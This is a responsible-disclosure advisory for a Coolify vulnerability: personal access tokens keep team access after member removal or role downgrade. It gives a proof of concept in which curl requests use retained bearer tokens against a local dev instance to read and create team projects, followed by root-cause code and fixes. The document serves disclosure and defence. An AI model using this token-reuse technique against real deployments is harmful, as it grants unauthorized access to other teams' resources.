# CVE-2026-53770: Coolify Personal Access Tokens retain team-scoped abilities after member removal or role downgrade

**Published:** 2026-07-28 **Reported:** 2026-05-22 **Severity:** 7.7 High (up to 8.8+ for owner-minted tokens) **Status:** Fixed in PR #10505 **CWEs:** CWE-613 (Insufficient Session Expiration) + CWE-672 (Operation on a Resource after Expiration or Release) + CWE-863 (Incorrect Authorization)

---

A Coolify Personal Access Token minted by a team member keeps its `team_id` binding and its `abilities` past the user's removal from that team and past the user's role downgrade. The REST API and the MCP server both authorize requests by reading the token's `team_id` directly, with no check that the user is still a member of that team. A former member with a previously issued token continues to read and modify the team's resources.

The pattern the codebase already implements for web sessions (validate live pivot membership at every call) is applied to one team-resolution path and skipped on the other, against the same DB state.

---

## Live reproduction

Freshly built v4.1.0 dev stack. `InstanceSettings.is_api_enabled = true`, `is_mcp_server_enabled = true`. Team `PocTeam` (id 4) with `AdminA` as owner and `UserB` as `admin`. `AdminA` had previously created a baseline project named `PocTeam-baseline`.

`UserB` mints three PATs through the production code path (Livewire UI `Security > API Tokens > Create Token`), which calls `App\Livewire\Security\ApiTokens::addNewToken` at `app/Livewire/Security/ApiTokens.php:106`, which calls `auth()->user()->createToken($description, $permissions, $expiresAt)`, which writes the row with `team_id = session('currentTeam')->id`.

`AdminA` then removes `UserB` from `PocTeam` via the admin UI, which calls `Member::remove` at `app/Livewire/Team/Member.php:65-83`:

```
$ docker compose exec -T coolify php artisan tinker --execute "..."
before: UserB role in PocTeam = admin
before: UserB has 3 tokens bound to team_id=4
detach() done
after : UserB role in PocTeam = NULL (removed)
after : UserB tokens bound to team_id=4 = 3
DELTA: tokens revoked = 0
```

`UserB` is detached from the pivot. Zero of `UserB`'s three PATs are revoked.

The read-ability token, after the removal, reads the team's project:

```
$ curl -sS -i -H "Authorization: Bearer 23|S2bqD0Okyp8xmvBlpjXbFgzsvi884XJb86WMmbAlfd6b0921" \
       -H "Accept: application/json" \
       http://localhost:8765/api/v1/projects
HTTP/1.1 200 OK
...
[{"id":13,"uuid":"e5jt66q6hamphwvq7k37wm0w",
  "description":"created by AdminA before UserB was removed",
  "name":"PocTeam-baseline"}]
```

The same token reads the team via MCP `list_projects` and returns the same project.

The write-ability token, after the removal, creates a new project under the team:

```
$ curl -sS -i -X POST \
       -H "Authorization: Bearer 24|fO9p0O0PQkj1yUDMg0HDQHAoCvHXU7zrvUfqjDLq3ad1e0f6" \
       -H "Accept: application/json" \
       -H "Content-Type: application/json" \
       --data '{"name":"after-removal-mutation","description":"created by ex-member as PoC"}' \
       http://localhost:8765/api/v1/projects
HTTP/1.1 201 Created
...
{"uuid":"sia3illb0byt6gqwj6fspuv4"}
```

The MCP `get_infrastructure_overview` tool returns the full team-wide overview to the former member.

## Role downgrade fires the same gap

`UserB` is re-attached to `PocTeam` as `admin`, then downgraded to `member` via `Member::makeReadonly` at `app/Livewire/Team/Member.php:49-63`. The write-ability token, minted while `UserB` was `admin`, still mutates the team after the downgrade:

```
$ docker compose exec -T coolify php artisan tinker --execute "..."
UserB re-attached as admin
before downgrade: UserB role = admin
after  downgrade: UserB role = member

$ curl -sS -i -X POST \
       -H "Authorization: Bearer 24|fO9p0O0PQkj1yUDMg0HDQHAoCvHXU7zrvUfqjDLq3ad1e0f6" \
       ...
       --data '{"name":"role-downgrade-mutation","description":"created by demoted ex-admin"}' \
       http://localhost:8765/api/v1/projects
HTTP/1.1 201 Created
...
{"uuid":"gtwowpxprb0dzs38c0in1tnz"}
```

The token's abilities were fixed at mint time and are not re-evaluated on the new role. The UI gate that prevents `member`-role users from performing write operations is bypassed via the token.

## Root cause

Mint binds `team_id` at session-time (`app/Models/User.php:212-230`):

```php
public function createToken(string $name, array $abilities = ['*'], ?DateTimeInterface $expiresAt = null)
{
    ...
    $token = $this->tokens()->create([
        'name' => $name,
        'token' => hash('sha256', $plainTextToken),
        'abilities' => $abilities,
        'expires_at' => $expiresAt,
        'team_id' => session('currentTeam')->id,
    ]);
    ...
}
```

Membership detach does not touch tokens (`app/Livewire/Team/Member.php:65-83`):

```php
public function remove()
{
    ...
    $this->member->teams()->detach(currentTeam());
    Cache::forget("team:{$this->member->id}");
    Cache::forget("user:{$this->member->id}:team:{$teamId}");
    $this->dispatch('reloadWindow');
    ...
}
```

Role downgrade does not touch tokens either (`app/Livewire/Team/Member.php:17-63`).

Token consumption reads the static `team_id` field on the REST API (`bootstrap/helpers/api.php:10-15`):

```php
function getTeamIdFromToken()
{
    $token = auth()->user()->currentAccessToken();
    return data_get($token, 'team_id');
}
```

MCP consumption follows the same shape (`app/Mcp/Concerns/ResolvesTeam.php:29-34`):

```php
protected function resolveTeamId(Request $request): ?int
{
    $token = $request->user()?->currentAccessToken();
    return $token?->team_id;
}
```

`auth:sanctum` is stock Sanctum and only validates that the token row exists and is not expired. `app/Http/Middleware/ApiAbility.php` checks the token's abilities but not the user's current team membership. None of the middleware on the token path verifies that `request()->user()` is still a member of `request()->user()->currentAccessToken()->team_id`.

## The codebase already implements the missing check on the session path

The same auth chain has two team-resolution mechanisms. The session-based one validates live pivot membership at every call:

```php
// app/Models/User.php:328-347
public function currentTeam(): ?Team
{
    $sessionTeamId = data_get(session('currentTeam'), 'id');

    if (is_null($sessionTeamId)) {
        return null;
    }

    // Check if user actually belongs to this team
    if (! $this->teams->contains('id', $sessionTeamId)) {
        session()->forget('currentTeam');
        Cache::forget('user:'.$this->id.':team:'.$sessionTeamId);

        return null;
    }

    return Cache::remember('user:'.$this->id.':team:'.$sessionTeamId, 3600, function () use ($sessionTeamId) {
        return Team::find($sessionTeamId);
    });
}
```

This is the helper that backs the global `currentTeam()` function and the `/api/v1/teams/current` endpoint. When `UserB` is removed from `PocTeam` and the same token reaches `TeamController::current_team`, `currentTeam()` runs, finds `! $this->teams->contains('id', 4)`, forgets the cache, returns `null`, and the controller returns 404. That endpoint is correctly defended.

The token-resolution helper `getTeamIdFromToken()` does not run this check; it returns the static `team_id` field from the token row. The rest of the REST API and the entire MCP surface route through `getTeamIdFromToken()` (or its MCP twin `ResolvesTeam::resolveTeamId`), not through `currentTeam()`. The same logical question, "does this user still belong to this team", is answered correctly on one path and skipped on the other against the same DB state.

That is the strongest evidence the gap is implementation, not design. The membership-validation pattern already exists in the codebase; it was applied to one team-resolution path and not to the other.

## Lifecycle gap, broader than removal

Grepping every code path that mutates the user-team relationship or rotates the user's credentials, written as `<trigger> (file:line), web session: <revoked?>, Sanctum PAT: <revoked?>`:

- **Admin removes member** (`app/Livewire/Team/Member.php:65-83`): web session not revoked; PAT not revoked.
- **Owner deletes team, effect on other members** (`app/Livewire/NavbarDeleteTeam.php:18-41`): web session revoked at lines 32-35; PAT not revoked.
- **Role downgrade** (`app/Livewire/Team/Member.php:17-63`, methods `makeReadonly` / `makeAdmin` / `makeOwner`): web session not revoked; PAT not revoked.
- **User changes password** (`app/Traits/DeletesUserSessions.php:26-32`): web session revoked; PAT not revoked.
- **User hard-deletes account** (`app/Models/User.php:106-157`): web session N/A; PAT orphaned via Sanctum's polymorphic `tokenable` resolution returning null, so the token stops authenticating as a side effect rather than by design.

The team-delete path explicitly deletes DB session rows for affected members at `NavbarDeleteTeam.php:32-35`. That code is direct evidence that revoking access requires revoking credentials. The Sanctum token vector was missed on that path and on every path in the table.

## Why "bearer trusts bearer" does not apply

The bearer model is correct only while the bearer remains entitled. The mint path encodes the team binding into the token row precisely so that team-scoping enforcement does not depend on the live `team_user` pivot. Membership changes are a routine product flow: admins remove members, owners demote admins to members, accounts are revoked. Each is an explicit intent to remove access, and Coolify already implements that intent for web sessions in two of the five lifecycle paths. The expectation that token-based access follows the same intent is established by the codebase itself.

## Fix direction

Minimum fix is to revoke the user's PATs bound to the affected team on the same code paths that detach the user or change their role:

```php
// app/Livewire/Team/Member.php  (inside remove(), makeReadonly(), makeAdmin(), makeOwner())
\Laravel\Sanctum\PersonalAccessToken::query()
    ->where('tokenable_type', \App\Models\User::class)
    ->where('tokenable_id', $this->member->id)
    ->where('team_id', currentTeam()->id)
    ->delete();
```

The same call inside `NavbarDeleteTeam::delete()` for the team's PATs, and inside `DeletesUserSessions::bootDeletesUserSessions` for the user's PATs on password change. The `personal_access_tokens.team_id` column already provides the data needed for an efficient scoped delete.

A defense-in-depth alternative: add a middleware after `auth:sanctum` that compares `$request->user()->teams->pluck('id')` against `$request->user()->currentAccessToken()->team_id` and 401s on mismatch. That places enforcement at consumption rather than at lifecycle events and covers any future code path that detaches a user.

## Disclosure

Reported privately to Coolify against `v4.1.0` (commit `49656aa1edbe8aa6f7f7077dbf689cb1a08f05ee`). Fixed by upstream in [PR #10505](https://github.com/coollabsio/coolify/pull/10505). CVE-2026-53770 assigned by GitHub on 2026-06-10.

Thanks to Andras and the Coolify team for the fast triage and the fix.

## Links

- CVE record: https://www.cve.org/CVERecord?id=CVE-2026-53770
- Fix PR: https://github.com/coollabsio/coolify/pull/10505
- Coolify: https://github.com/coollabsio/coolify
- Sanctum PATs docs: https://laravel.com/docs/12.x/sanctum#api-token-authentication
- CWE-613: https://cwe.mitre.org/data/definitions/613.html
- CWE-672: https://cwe.mitre.org/data/definitions/672.html
- CWE-863: https://cwe.mitre.org/data/definitions/863.html
